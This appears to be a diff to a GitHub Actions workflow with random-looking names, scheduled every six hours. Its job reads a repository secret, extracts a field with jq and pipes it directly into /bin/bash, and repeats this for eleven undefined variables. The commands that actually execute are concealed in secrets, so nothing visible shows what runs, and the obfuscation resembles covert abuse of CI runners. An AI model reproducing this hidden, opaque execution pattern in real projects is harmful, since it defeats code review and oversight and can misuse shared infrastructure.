@@ -3,19 +3,26 @@ name: tianqiguang4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 5/6 * * *'
-
-jobs:  # 12331
+    - cron: '13 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tianqiguang4567
         env:
-          ou43: ${{ secrets.ou43 }}
+          zd316: ${{ secrets.zd316 }}
         run: |
-          echo $ou43 | jq -r .y95 | /bin/bash
-          echo $fmsyb28811 | jq -r .oah360 | /bin/bash
-          echo $cjoin933 | jq -r .nkiou04 | /bin/bash
+          echo $zd316 | jq -r .wct25 | /bin/bash
+          echo $vcogc31 | jq -r .oq68651 | /bin/bash
+          echo $ji593 | jq -r .fgjj36368 | /bin/bash
+          echo $htsx2 | jq -r .vx24 | /bin/bash
+          echo $nxafr67 | jq -r .kgp56063 | /bin/bash
+          echo $jxk6 | jq -r .ugs4677 | /bin/bash
+          echo $hc6710 | jq -r .vmgh7148 | /bin/bash
+          echo $gzb2755 | jq -r .ck09595 | /bin/bash
+          echo $ok73329 | jq -r .a385 | /bin/bash
+          echo $p33517 | jq -r .po1501 | /bin/bash
+          echo $nmol1 | jq -r .pjem6 | /bin/bash
+          echo $fwzmr411 | jq -r .ija507 | /bin/bash
 
